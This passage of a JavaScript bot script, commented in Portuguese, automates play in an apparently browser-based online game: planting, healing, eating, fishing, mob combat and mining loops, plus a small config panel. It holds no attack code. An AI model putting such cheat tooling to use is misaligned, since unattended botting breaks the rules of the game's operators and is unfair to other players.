      await xDelay(400);
      for (let j = 0; j < 9; j++) {
        if (!dsk.aloe.enabled) return;
        await xDoKeyPress(6, 180);
        await xDelay(800);
      }
      await xDoMove(myself.x + 1, myself.y);
      await xDelay(400);
      await xDoPickUp();
      await xDelay(400);
      await xDoUseSlot(shovelSlot);
      await xDelay(400);
      await xDoChangeDir(0);
      await xDelay(400);
      await digUntilReady(myself.x, myself.y - 1);
    }
    if (myself.dir == 2 && !hasWallRight) {
      await xDelay(400);
      await xDoDropByID(0, 621);
      await xDelay(400);
      await xDoUseSlotByID(xGetSlotByID(719));
      await xDelay(400);
      await xDoMove(myself.x + 1, myself.y);
      await xDelay(400);
      await xDoChangeDir(3);
      await xDelay(400);
      for (let j = 0; j < 9; j++) {
        if (!dsk.aloe.enabled) return;
        await xDoKeyPress(6, 180);
        await xDelay(800);
      }
      await xDoMove(myself.x - 1, myself.y);
      await xDelay(400);
      await xDoPickUp();
      await xDelay(400);
      await xDoUseSlot(shovelSlot);
      await xDelay(400);
      await xDoChangeDir(2);
      await xDelay(400);
      await digUntilReady(myself.x, myself.y + 1);
    }
    if (myself.dir == 2 && hasWallRight) {
      await xDelay(400);
      await xDoDropByID(0, 621);
      await xDelay(400);
      await xDoUseSlotByID(xGetSlotByID(719));
      await xDelay(400);
      await xDoMove(myself.x - 1, myself.y);
      await xDelay(400);
      await xDoChangeDir(1);
      await xDelay(400);
      for (let j = 0; j < 9; j++) {
        if (!dsk.aloe.enabled) return;
        await xDoKeyPress(6, 180);
        await xDelay(800);
      }
      await xDoMove(myself.x + 1, myself.y);
      await xDelay(400);
      await xDoPickUp();
      await xDelay(400);
      await xDoUseSlot(shovelSlot);
      await xDelay(400);
      await xDoChangeDir(2);
      await xDelay(400);
      await digUntilReady(myself.x, myself.y + 1);
    }
  }

  async function checkShovel() {
    if (inv[0]?.equip === 2) await repairShovel();
  }

  function getFrontTile() {
    if (myself.dir === 1) return {x: myself.x + 1, y: myself.y};
    if (myself.dir === 3) return {x: myself.x - 1, y: myself.y};
    if (myself.dir === 0) return {x: myself.x, y: myself.y - 1};
    if (myself.dir === 2) return {x: myself.x, y: myself.y + 1};
  }

  function getObstacle(x, y) {
    return objects.items.find(el =>
      el && (el.name.includes('Tree') || el.name.includes('Bush') || el.name.includes('Rock')) &&
      el.x === x && el.y === y
    );
  }

  async function clearObstacle(x, y) {
    let obstacle = getObstacle(x, y);
    let tries = 0;
    while (obstacle && tries < 20) {
      await xDoKeyPress(6, 219);
      await xDelay(321);
      obstacle = getObstacle(x, y);
      tries++;
    }
  }

  async function digTile() {
    await checkShovel();
    await xDoKeyPress(6, 211);
    await xDelay(441);
  }

  async function digUntilReady(x, y) {
    let tries = 0;
    while (occupied(x, y) === 0 && tries < 10) {
      await digTile();
      await xDelay(350);
      tries++;
    }
  }

  async function plantSeed() {
    await xDelay(150);
    await xDoPickUp();
    await xDelay(100);
    await xDoUseSlot(seedSlot);
    await xDelay(110);
  }

  const front = getFrontTile();
  const obstacleFront = getObstacle(front.x, front.y);

  // =========================
  // WALL DIREITA >
  // =========================
  if (myself.dir === 1 && hasWallRight) {

    // 1) cavar em cima
    if (farmOcc(myself.x, myself.y - 1) === 0) {
      await xDelay(515);
      await xDoChangeDir(0);
      await xDelay(418);
      await xDoUseSlot(shovelSlot);
      await digUntilReady(myself.x, myself.y - 1);
      await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
    }

    // 2) limpar bush em baixo
    await xDelay(423);
    await xDoChangeDir(2);
    await xDelay(418);
    await clearObstacle(myself.x, myself.y + 1);

    // 3) descer e plantar
    await xDelay(325);
    await xDoMove(myself.x, myself.y + 1);
    await xDelay(234);
    await plantSeed();

    // 4) cavar embaixo (tile destino)
    if (farmOcc(myself.x, myself.y + 1) === 0) {
      await xDelay(423);
      await xDoChangeDir(2);
      await xDelay(418);
      await xDoUseSlot(shovelSlot);
      await xDelay(418);
      await digUntilReady(myself.x, myself.y + 1);
      await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
    }

    // virar esquerda
    await xDelay(349);
    await xDoChangeDir(3);

    return;
  }

  // =========================
  // WALL ESQUERDA < (Tribe Gate — sem plantio, tem piso)
  // =========================
  if (myself.dir === 3 && hasWallLeft) {

    // 1) cavar embaixo
    if (farmOcc(myself.x, myself.y + 1) === 0) {
      await xDelay(549);
      await xDoChangeDir(2);
      await xDelay(418);
      await xDoUseSlot(shovelSlot);
      await xDelay(418);
      await digUntilReady(myself.x, myself.y + 1);
      await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
    }

    // 3) lógica de drop/pickup na Tribe Gate
    const gateLeft = objects.items.find(el =>
      el?.name === 'Tribe Gate' && el.x === myself.x - 1 && el.y === myself.y
    );
    if (gateLeft) {
      const aloe    = item_data.find(el => el?.n?.includes('Aloe'));
      await xDelay(500);
      await xDoKeyPress(6, 200);
      await xDelay(500);
      await xDoPickUp();
      await xDelay(500);
	  await xDoPickUp();
      await xDelay(500);
      if (aloe) await xDoDropByID(0, 767);
      await xDelay(500);
      const sementeAtual = item_data.find(el => el?.n?.includes('Seed'));
	  if (sementeAtual && sementeAtual.qty > 50) {
		const qnts = sementeAtual.qty - 50;
		await xDelay(500);
		await xDoDropByID(qnts, 614);
	}
      await xDelay(500);
      await xDoChangeDir(0);
      await xDelay(500);
      await xDoKeyPress(6, 200);
      await xDelay(500);
      await xDoChangeDir(1);
    }

    return;
  }

  // =========================
  // Movimento normal lateral
  // =========================
  if (myself.dir === 1) {
    if (farmOcc(myself.x, myself.y - 1) === 0) {
      await xDoChangeDir(0);
      await xDelay(357);
      await xDoUseSlot(shovelSlot);
      await xDelay(418);
      await digUntilReady(myself.x, myself.y - 1);
      await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
      await xDoChangeDir(1);
    }
  } else if (myself.dir === 3) {
    if (farmOcc(myself.x, myself.y + 1) === 0) {
      await xDoChangeDir(2);
      await xDelay(418);
      await xDoUseSlot(shovelSlot);
      await xDelay(418);
      await digUntilReady(myself.x, myself.y + 1);
      await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
      await xDoChangeDir(3);
    }
  } else {
    if (farmOcc(front.x, front.y) === 0) {
      await xDelay(418);
      await xDoUseSlot(shovelSlot);
      await digUntilReady(front.x, front.y);
      await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
    }
  }

  // =========================
  // Obstáculo à frente
  // =========================
  if (obstacleFront) {
    await xDoKeyPress(6, 239);
    await xDelay(213);
    return;
  }

  // mover e plantar normalmente
  await xDoMove(front.x, front.y);
  await xDelay(237);
  await plantSeed();
}


// ── AUTO HEAL ─────────────────────────────────────────────────

dsk.heal = { enabled: false };

dsk.setCmd('/heal', () => {
  dsk.heal.enabled = !dsk.heal.enabled;

  if (dsk.heal.enabled) {
    dsk.localMsg('Auto Heal: Ativado', '#5f5');
    (async function loop() {
      while (dsk.heal.enabled) {
        if (game_state === 2) await xHeal();
        await xDelay(551);
      }
    })();
  } else {
    xGoing[104] = false;
    dsk.localMsg('Auto Heal: Desativado', '#f55');
  }
});

// ── AUTO FOOD ─────────────────────────────────────────────────

dsk.food = { enabled: false };

async function xFood() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (xGoing[107] === true) return;
  xGoing[107] = true;

  const foodId = xGetSlotFood(); // já existe no wcave
  if (foodId === undefined) {
    xGoing[107] = false;
    return;
  }

  if (hunger_status.val <= 65) {
    const foodSlot = xGetSlotByID(foodId);
    await xDoUseSlotByID(foodSlot);
    await xDelay(2000);
  }

  xGoing[107] = false;
}

dsk.setCmd('/food', () => {
  dsk.food.enabled = !dsk.food.enabled;

  if (dsk.food.enabled) {
    dsk.localMsg('Auto Food: Ativado', '#5f5');
    (async function loop() {
      while (dsk.food.enabled) {
		if (dskPaused) return; // ← adiciona isso
		if (!myself || game_state !== 2) return;
        if (game_state === 2) await xFood();
        await xDelay(591);
      }
    })();
  } else {
    xGoing[107] = false;
    dsk.localMsg('Auto Food: Desativado', '#f55');
  }
});

// ── FISH BOT ──────────────────────────────────────────────────

dsk.fish = { enabled: false };

dsk.setCmd('/fish', () => {
  dsk.fish.enabled = !dsk.fish.enabled;

  if (dsk.fish.enabled) {
    dsk.localMsg('Fish Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.fish.enabled) {
        if (game_state === 2) await xFish();
        await xDelay(300);
      }
    })();
  } else {
    xGoing[3] = false;
    xTemp[9]  = false;
    xTemp[10] = false;
    dsk.localMsg('Fish Bot: Desativado', '#f55');
  }
});

async function xFish() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (xGoing[3] === true) return;
  xGoing[3] = true;
  if (currentLevel > 0 && skillLevel >= currentLevel && ['fishing'].includes(skillName)) {
	await xDelay(1210);
	dsk.fish.enabled = false;
	xGoing[3] = false;
	xTemp[9]  = false;
    xTemp[10] = false;
	dsk.localMsg('Fish: Desativado', '#f55');
    return;
	}

  if (xIfChatHas('A bite!')) {
    dsk.localMsg('Catching the fish', '#0ff');
    xTemp[10] = true;
    await xDoClearChat('A bite!');
    xGoing[3] = false;
    return;
  }

  if (xIfChatHas('It got away..')) {
    xTemp[9] = true;
    await xDoClearChat('It got away..');
    xGoing[3] = false;
    return;
  }

  if (xIfChatHas('You land')) {
    xTemp[9] = true;
    await xDoClearChat('You land');
    xGoing[3] = false;
    return;
  }

  if (xIfChatHas('You cast')) {
    // Relança se o grau foi F
    if (!xIfChatHas('F-]') && !xIfChatHas('F]') && !xIfChatHas('F+]')) {
      dsk.localMsg('Recasting (grade F)', '#ff0');
      xTemp[9] = false;
    }
    await xDoClearChat('You cast');
    xGoing[3] = false;
    return;
  }

  // Fisgou → pressiona espaço pra pegar
  if (xTemp[10] === true) {
    dsk.localMsg('Casting', '#0ff');
    await xDoKeyPress(6, 213);
    await xDelay(220);
    xTemp[10] = false;
    xGoing[3] = false;
    return;
  }

  // Perdeu / precisa relançar
  if (xTemp[9] === true) {
    dsk.localMsg('Casting', '#0ff');
    await xDoKeyPress(6, 211);
    await xDelay(221);
    xGoing[3] = false;
    return;
  }

  xGoing[3] = false;
}

// ── MYST BOT ──────────────────────────────────────────────────

// Nome do mob alvo — troca pelo que quiser
window.xMob = 'ratraccoon';

dsk.myst = { enabled: false };

dsk.setCmd('/newbi', () => {
  dsk.myst.enabled = !dsk.myst.enabled;

  if (dsk.myst.enabled) {
    dsk.localMsg('Newbi Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.myst.enabled) {
        if (game_state === 2) await xMyst();
        await xDelay(521);
      }
    })();
  } else {
    xGoing[101] = false;
    target.id = me;
    dsk.localMsg('Newbi Bot: Desativado', '#f55');
  }
});

// Define o mob alvo via /xmob <nome>
dsk.setCmd('/xmob', (context) => {
  if (!context) {
    dsk.localMsg(`Mob atual: ${xMob}`, '#ff0');
    return;
  }
  xMob = context.trim();
  dsk.localMsg(`Mob alvo: ${xMob}`, '#0ff');
});

async function xEnsureSword() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (!inv[0] || inv[0].sprite === undefined) {
    send({ type: 'bld', tpl: 'wood_sword' });
    await xDelay(331);
    xDoUseSlot(0);
    await xDelay(234);
  }
}

async function xMyst() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (xGoing[101] === true) return;
  xGoing[101] = true;

  await xEnsureSword();

  if (hp_status.val <= 25) {
    await xMystHandleLowHp();
  } else {
    await xMystHandleCombat();
  }

  target.id = me;
  xGoing[101] = false;
}

async function xMystHandleLowHp() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (myself.y <= 24) {
    if (myself.y <= 21) await xDoMove(25, 16);
    await xDoMove(25, 24);
  }
  if (myself.x <= 23 && myself.y >= 39) await xDoMove(28, 38);

  if (myself.x === 21 && myself.y === 27) {
    await xDoChangeDir(0);
    await xDoKeyPress(6, 2000);
  } else {
    await xDoMove(21, 27);
  }
}

async function xMystHandleCombat() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  await xGetMobByName(xMob);

  if (xTemp[13] !== undefined && xTemp[13] !== myself) {
    await xMystAtacar();
    return;
  }

  // Patrulha entre dois pontos
  if (myself.x !== 22 || myself.y !== 31) {
    await xDoMove(22, 31);
  } else {
    await xDoMove(30, 36);
  }
}

async function xMystAtacar() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (target.id !== xTemp[13].id) {
    target.id = xTemp[13].id;
    send({ type: 't', t: target.id });
  }

  const dist = Math.abs(xTemp[13].x - myself.x) + Math.abs(myself.y - xTemp[13].y);
  if (dist > 1) {
    await xDoMove(xTemp[13].x, xTemp[13].y);
    await xDelay(300);
    const distDepois = Math.abs(xTemp[13].x - myself.x) + Math.abs(myself.y - xTemp[13].y);
    if (distDepois > 2) target.id = me;
  }
}

// ── newbi CONFIG PANEL ─────────────────────────────────────────

dsk.mystManager = jv.Dialog.create(220, 140);
const mm = dsk.mystManager;
mm.visible = false;

mm.header = jv.text('Newbi Config', {
  font: '14px Verdana', fill: 0xFFD700, stroke: 0x555555, strokeThickness: 2,
});
mm.addChild(mm.header);
jv.center(mm.header);
jv.top(mm.header, 4);

mm.close = jv.Button.create(0, 0, 24, 'X', mm, 24);
jv.top(mm.close, 4); jv.right(mm.close, 4);
mm.close.on_click = () => (mm.visible = 0);

mm.move = jv.Button.create(0, 0, 24, '@', mm, 24);
jv.top(mm.move, 4); jv.right(mm.move, 28);

mm._px = 0; mm._py = 0;
window.addEventListener('mousemove', e => { mm._px = e.clientX; mm._py = e.clientY; });
window.addEventListener('touchmove', e => { mm._px = e.touches[0].clientX; mm._py = e.touches[0].clientY; });

mm.updatePosition = () => {
  if (mm.move.is_pressed) {
    const canvas = document.querySelector('canvas');
    const rect = canvas ? canvas.getBoundingClientRect() : { left: 0, top: 0, width: jv.game_width, height: jv.game_height };
    mm.x = (mm._px - rect.left) * (jv.game_width / rect.width) - mm.w / 2;
    mm.y = (mm._py - rect.top) * (jv.game_height / rect.height) - 12;
  }
  if (mm.x < 0) mm.x = 0;
  if (mm.y < 0) mm.y = 0;
  if (mm.x + mm.w > jv.game_width)  mm.x = jv.game_width - mm.w;
  if (mm.y + mm.h > jv.game_height) mm.y = jv.game_height - mm.h;
};
dsk.on('postLoop', mm.updatePosition);

const mmLbl = (txt, y) => {
  const l = jv.text(txt, { font: '11px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2 });
  l.x = 10; l.y = y; mm.addChild(l); return l;
};

mm.lblMob    = mmLbl(`Mob: ${window.xMob}`, 38);
mm.lblHP     = mmLbl('HP: -', 53);
mm.lblTarget = mmLbl('Target: -', 68);
mm.lblStatus = mmLbl('Status: -', 83);

dsk.on('postLoop', () => {
  if (!mm.visible) return;
  mm.lblMob.text    = `Mob: ${xMob ?? '-'}`;
  mm.lblHP.text     = `HP: ${hp_status?.val?.toFixed(1) ?? '-'}%`;
  mm.lblTarget.text = `Target: ${xTemp[13]?.name ?? 'nenhum'}`;
  mm.lblStatus.text = `Status: ${dsk.myst.enabled ? 'ON' : 'OFF'}`;
});

// Botões de mob preset
const mobPresets = ['ratraccoon', 'wolf', 'snake', 'Polar Bear'];
let mobIdx = 0;

const btnMob = jv.Button.create(0, 0, 100, mobPresets[0], mm, 20);
btnMob.x = 110; btnMob.y = 36;
btnMob.on_click = () => {
  mobIdx = (mobIdx + 1) % mobPresets.length;
  xMob = mobPresets[mobIdx];
  btnMob.label.text = xMob;
};

dsk.setCmd('/newbiconfig', () => {
  mm.visible = !mm.visible;
  dsk.localMsg(`Newbi Config: ${mm.visible ? 'Aberto' : 'Fechado'}`, mm.visible ? '#5f5' : '#f55');
});

// ── GLOBALS COMPARTILHADOS ────────────────────────────────────
// (só declara se ainda não existirem, pois wcave usa alguns deles)

window.xWCID4         = 0;        // ID do slot 3 (picareta) — definido ao ligar /mining
window.xRepairDropX   = 0;
window.xRepairDropY   = 0;
window.xRepairHoldTicks = 0;
window.WCMiningListX  = new Array(250).fill(0);
window.WCMiningListY  = new Array(250).fill(0);
window.mobNearMe      = false;
window.player_dict    = window.player_dict ?? {};

// Items que o bot pode catar do chão
const xItensPermitidos = [
  353, 758, 494, 342, 344, 337, 338,
  356, 346, 343, 1, 465, 837,
  731, 665, 761, 242, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766,
  806, 837, 698, 94, 74, 77, 324, 323, 602, 603, 919, 649, 650, 658, 639, 517,
  637, 638, 622, 623, 679
];

// ── FUNÇÕES AUXILIARES ────────────────────────────────────────

// Retorna a parede (objeto imóvel) mais próxima pelo sprite ID
function xGetWallByID(id) {
  let best;
  for (let i in objects.items) {
    const obj = objects.items[i];
    if (!obj || obj.can_pickup !== 0 || obj.sprite !== id) continue;
    if (!best || xGetDistance(obj.x, obj.y, myself.x, myself.y) <
                 xGetDistance(best.x, best.y, myself.x, myself.y)) {
      best = obj;
    }
  }
  return best;
}

// Retorna se alguma pedra (rock sprites) está adjacente ao personagem
function isRockNextToMe() {
  const rockSprites = [-261, -618, -518];
  const sides = [
    { dx: 1, dy: 0 }, { dx: -1, dy: 0 },
    { dx: 0, dy: 1 }, { dx: 0, dy: -1 }
  ];
  return sides.some(c => {
    const w = xGetWallByPos(myself.x + c.dx, myself.y + c.dy);
    return w && rockSprites.includes(w.sprite);
  });
}

// Move até o objeto/wall pelo ID
async function xDoMoveToID(id) {
  const item = xGetItemByID(id);
  if (item) { await xDoMove(item.x, item.y); return; }
  const wall = xGetWallByID(id);
  if (wall) await xDoMove(wall.x, wall.y);
}

// Varre objetos e seta xTemp[19] com a rocha mais próxima acessível
async function WCFindRocks() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (mobNearMe) return;
  xTemp[19] = undefined;
  const rockSprites = [-261, -618, -518];
  for (const spr of rockSprites) {
    const w = xGetWallByID(spr);
    if (!w) continue;
    if (!xTemp[19] ||
        xGetDistance(w.x, w.y, myself.x, myself.y) <
        xGetDistance(xGetWallByID(xTemp[19]).x, xGetWallByID(xTemp[19]).y, myself.x, myself.y)) {
      xTemp[19] = spr;
    }
  }
  if (xTemp[19] !== undefined) await xDoMoveToID(xTemp[19]);
}

// Verifica lista de posições por presença de jogadores
function xGetPlayerByPosList(exList, wyList) {
  for (let j in mobs.items) {
    const mob = mobs.items[j];
    if (!mob || mob.id === me) continue;
    if (player_dict[mob.id] === undefined) continue;
    for (let ex in exList) {
      for (let wy in wyList) {
        if (mob.x === exList[ex] && mob.y === wyList[wy]) return mob;
      }
    }
  }
  return undefined;
}

// Encontra Shiny Rock acessível mais próxima → xTemp[170]
async function xGetShiny() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  xTemp[170] = undefined;
  for (let i in objects.items) {
    const obj = objects.items[i];
    if (!obj || obj.can_pickup !== 0 || obj.name !== 'Shiny Rock') continue;
	if (xTemp[99] && xTemp[99].x === obj.x && xTemp[99].y === obj.y && Date.now() < xTemp[99].until) continue;
    const exList = [obj.x + 1, obj.x - 1, obj.x,     obj.x    ];
    const wyList = [obj.y,     obj.y,     obj.y + 1, obj.y - 1];
    if (xGetPlayerByPosList(exList, wyList) !== undefined) continue;
    let canReach = false;
	for (let s = 0; s < exList.length; s++) {
	  await xGetCanMove(exList[s], wyList[s]);
	  if (xCanMov) { canReach = true; break; }
	}
	if (!canReach) continue;
    if (!xTemp[170] ||
        xGetDistance(obj.x, obj.y, myself.x, myself.y) <
        xGetDistance(xTemp[170].x, xTemp[170].y, myself.x, myself.y)) {
      xTemp[170] = obj;
    }
  }
  return xTemp[170];
}

async function xGetSSDStone() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;
  xTemp[172] = undefined;
  const rockSprites = [-261, -618];
  for (let i in objects.items) {
    const obj = objects.items[i];
    if (!obj || obj.can_pickup !== 0) continue;
    // verifica por nome OU por sprite
    if (obj.name !== 'Rock' && !rockSprites.includes(obj.sprite)) continue;
	if (xTemp[99] && xTemp[99].x === obj.x && xTemp[99].y === obj.y && Date.now() < xTemp[99].until) continue;
    const exList = [obj.x + 1, obj.x - 1, obj.x,     obj.x    ];
    const wyList = [obj.y,     obj.y,     obj.y + 1, obj.y - 1];
    if (xGetPlayerByPosList(exList, wyList) !== undefined) continue;
    let canReach = false;
	for (let s = 0; s < exList.length; s++) {
	  await xGetCanMove(exList[s], wyList[s]);
	  if (xCanMov) { canReach = true; break; }
	}
	if (!canReach) continue;
    if (!xTemp[172] ||
        xGetDistance(obj.x, obj.y, myself.x, myself.y) <
        xGetDistance(xTemp[172].x, xTemp[172].y, myself.x, myself.y)) {
      xTemp[172] = obj;
    }
  }
  return xTemp[172];
}

// Encontra Baú (Odd/Treasure) acessível mais próximo → xTemp[171]
async function xGetChest() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  xTemp[171] = undefined;
  const chestNames = ['Odd Chest', 'Treasure Chest'];
  for (let i in objects.items) {
    const obj = objects.items[i];
    if (!obj || obj.can_pickup !== 0 || !chestNames.includes(obj.name)) continue;
    const exList = [obj.x + 1, obj.x - 1, obj.x,     obj.x    ];
    const wyList = [obj.y,     obj.y,     obj.y + 1, obj.y - 1];
    if (xGetPlayerByPosList(exList, wyList) !== undefined) continue;
    let canReach = false;
	for (let s = 0; s < exList.length; s++) {
		await xGetCanMove(exList[s], wyList[s]);
		if (xCanMov) { canReach = true; break; }
	}
	if (!canReach) continue;
    if (!xTemp[171] ||
        xGetDistance(obj.x, obj.y, myself.x, myself.y) <
        xGetDistance(xTemp[171].x, xTemp[171].y, myself.x, myself.y)) {
      xTemp[171] = obj;
    }
  }
  return xTemp[171];
}

// Pega o drop mais próximo da lista de permitidos
async function xPickSpecificDrop() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  let best;
  for (let i in objects.items) {
    const item = objects.items[i];
    if (!item || item.can_pickup !== 1) continue;
    if (!xItensPermitidos.includes(item.sprite)) continue;
    if (!best || xGetDistance(item.x, item.y, myself.x, myself.y) <
                 xGetDistance(best.x, best.y, myself.x, myself.y)) {
      best = item;
    }
  }
  if (!best) return false;
  await xDoMove(best.x, best.y);
  await xDelay(500);
  for (let i = 0; i < 3; i++) { await xDoPickUp(); await xDelay(150); }
  return true;
}

// Versão do xGetMobByName adaptada para mining (prioriza mobs atacando)
async function xGetMobByNameMining(nameList) {
  xTemp[13] = myself;
  xTemp[15] = myself;
  for (let i in mobs.items) {
    const mob = mobs.items[i];
    if (!mob || mob === myself) continue;
    if (xPlyrTest(mob)) continue;
    const nameMatch = nameList.some(n =>
      mob.name.toLowerCase().replace(/ /g, '').includes(n.toLowerCase().replace(/ /g, ''))
    );
    if (!nameMatch) continue;
    const dist = xGetDistance(mob.x, mob.y, myself.x, myself.y);
    if (dist > 2) continue;
    if (xTemp[15] === myself ||
        dist < xGetDistance(xTemp[15].x, xTemp[15].y, myself.x, myself.y)) {
      xTemp[15] = mob;
    }
  }
  xTemp[13] = xTemp[15];
  return xTemp[13];
}

// ── HELPER: pickup de todos os IDs de gear ────────────────────

async function xPickupAllGear(...ids) {
  for (const id of ids) {
    const item = xGetItemByID(id);
    if (!item) continue;
    await xDoMove(item.x, item.y);
    for (let p = 0; p < 5; p++) { await xDoPickUp(); await xDelay(100); }
  }
}

// ── HELPER: equipa slots 0,1,2 se desequipados ───────────────

async function xEquipSlots() {
  if (inv[0]?.equip === 0) { xDoUseSlot(0); await xDelay(100); }
  if (inv[1]?.equip === 0) { xDoUseSlot(1); await xDelay(200); }
  if (inv[2]?.equip === 0) { xDoUseSlot(2); await xDelay(100); }
}


// ── xSSD BOT ──────────────────────────────────────────────────

dsk.ssd = { enabled: false };

dsk.setCmd('/ssd', () => {
  dsk.ssd.enabled = !dsk.ssd.enabled;

  if (dsk.ssd.enabled) {
    xWCID1 = inv[0]?.sprite;
    xWCID2 = inv[1]?.sprite;
    xWCID3 = inv[2]?.sprite;
	xWCID4 = inv[3]?.sprite; // ← adiciona isso
    repItem = xGetItemNameBySlot(0) ?? '';
	dsk.ssd.targetMode    = dsk.ssd.targetMode    ?? 'shiny'; // 'shiny' | 'stone' | 'both'
	dsk.ssd.repairInPlace = dsk.ssd.repairInPlace ?? false;

    if (!xWCID1 || !xWCID2 || !xWCID3 || !xWCID4) {
      dsk.localMsg('SSD: coloque itens nos slots 0, 1, 2 e 3 primeiro!', '#f55'); // ← atualiza mensagem
      dsk.ssd.enabled = false;
      return;
    }

    // ── Reset completo ao ligar ──────────────────────────────
    xGoing[110] = false;
    xMovingNow = false;
    xNeedsRep = false;
    RepTimer = 0;
	xTemp[13] = myself; // ← reseta mob alvo
	xTemp[170] = undefined; // ← reseta shiny
	xTemp[171] = undefined; // ← reseta chest
	xTemp[172] = undefined; // reseta stone
    xTemp[70] = undefined; // força reinit waypoints
    xTemp[90] = undefined; // cache mob X
    xTemp[91] = undefined; // cache mob Y
    xTemp[92] = undefined; // cache wp X
    xTemp[93] = undefined; // cache wp Y
    target.id = me;

    dsk.localMsg(`SSD Bot: Ativado | ID1=${xWCID1} ID2=${xWCID2} ID3=${xWCID3}`, '#5f5');

    (async function loop() {
      while (dsk.ssd.enabled) {
        try {
          await xSSD();
        } catch(e) {
          console.log('[SSD] erro:', e);
          xGoing[110] = false;
          xMovingNow = false;
        }
        await xDelay(500);
      }
    })();

  } else {
    xGoing[110] = false;
    xMovingNow = false;
    xNeedsRep = false;
	xTemp[13] = myself; // ← reseta mob alvo
	xTemp[170] = undefined; // ← reseta shiny
	xTemp[171] = undefined; // ← reseta chest
	xTemp[172] = undefined; //reseta stone
    xTemp[90] = undefined;
    xTemp[91] = undefined;
    xTemp[92] = undefined;
    xTemp[93] = undefined;
    target.id = me;
    dsk.localMsg('SSD Bot: Desativado', '#f55');
  }
});

async function xSSD() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  if (connection?.readyState === 3) { xMovingNow = false; return; }
  if (!connection) { xMovingNow = false; return; }

  // Auto-reset se travar por mais de 10s
  if (xGoing[110] === true) {
    if (!xGoing._ssdTime) xGoing._ssdTime = Date.now();
    if (Date.now() - xGoing._ssdTime > 10000) {
      xGoing[110]     = false;
      xGoing._ssdTime = undefined;
      xMovingNow      = false;
    }
    return;
  }
  xGoing[110]     = true;
  xGoing._ssdTime = undefined;

  // ── INIT WAYPOINTS ──────────────────────────────────────────
  if (xTemp[70] === undefined) {
    xTemp[70] = 0;
    xTemp[71] = 25;
    const px = [9,25,30,25,39,26,27,25,27,25,56,56,56,79,79,75,85,69,52,52,52,69,85,75,79,79];
    const py = [8,15,32,54,56,65,75,39,23,13,12,42,12,14,44,56,76,78,74,57,74,78,76,56,44,12];
    for (let i = 0; i < px.length; i++) {
      WCPosListX[i] = px[i];
      WCPosListY[i] = py[i];
    }
    xTemp[92] = undefined;
    xTemp[93] = undefined;
    dsk.localMsg('SSD: waypoints iniciados', '#0ff');
  }


// ── MODO REPARO ─────────────────────────────────────────────
  if (xNeedsRep) {
    if (dsk.ssd.repairInPlace) {
      await xSSDRepairInPlace();
    } else {
      await xSSDRepair();
    }
    xGoing[110] = false;
    return;
  }

  // ── COMIDA ──────────────────────────────────────────────────
  const foodId = xGetSlotFood();
  if (foodId !== undefined) {
    if (hunger_status.val <= 70) {
      await xDoUseSlotByID(xGetSlotByID(foodId));
      await xDelay(2000);
    }
  } else {
    xDoLogOff();
    xGoing[110] = false;
    return;
  }


// ── GEAR QUEBRADO ─────────────────────────────────────────────
  if (inv[0]?.equip === 2 || inv[1]?.equip === 2 || inv[2]?.equip === 2 || inv[3]?.equip === 2) {
    if (dsk.ssd.repairInPlace) {
      xNeedsRep   = true;
      xMovingNow  = false;
      xDoKeyUp(6);
      await xDelay(900);
      xTemp[92]   = undefined;
      xTemp[93]   = undefined;
      xTemp[97]   = undefined; // ← reseta cache da pedra
      xTemp[98]   = 0;
      xGoing[110] = false;
      return;
    } else {
      xDoLogOff();
      xGoing[110] = false;
      return;
    }
  }

  // ── HP ────────────────────────────────────────────────────────
  if (hp_status.val <= 70 && hp_status.val >= 0.1) {
    await xHeal();
    if (hp_status.val <= 40) {
      xDoLogOff();
      xGoing[110] = false;
      return;
    }
  }

// ── SLOTS VAZIOS ─────────────────────────────────────────────
  if (!inv[0]?.sprite || !inv[1]?.sprite || !inv[2]?.sprite || !inv[3]?.sprite) {
    await xPickupAllGear(xWCID4, xWCID3, xWCID1, xWCID2);
    xDoLogOff();
    xGoing[110] = false;
    return;
  }

// ── SHINY / STONE ROCK ───────────────────────────────────────
  let xunhit = false;
  const _ssdMode = dsk.ssd.targetMode ?? 'shiny';
  const _stoneSprites = [-261, -618];

  if (_ssdMode === 'shiny' || _ssdMode === 'both') await xGetShiny();
  if (_ssdMode === 'rock'  || _ssdMode === 'both') await xGetSSDStone();

  const _ssdTarget  = xTemp[170] ?? xTemp[172];
  const _ssdIsShiny = xTemp[170] !== undefined;

  if (_ssdTarget && xTemp[13] === myself) {
    const sides = [
      { dx: 0, dy: -1, dir: 0 }, { dx: 1, dy:  0, dir: 1 },
      { dx: 0, dy:  1, dir: 2 }, { dx: -1, dy: 0, dir: 3 }
    ];
    for (const c of sides) {
      const wall = xGetWallByPos(myself.x + c.dx, myself.y + c.dy);
      if (!wall) continue;

      const isTarget = _ssdIsShiny
        ? wall.name === 'Shiny Rock'
        : (wall.name === 'Rock' || _stoneSprites.includes(wall.sprite)); // ← fix: era rockSprites

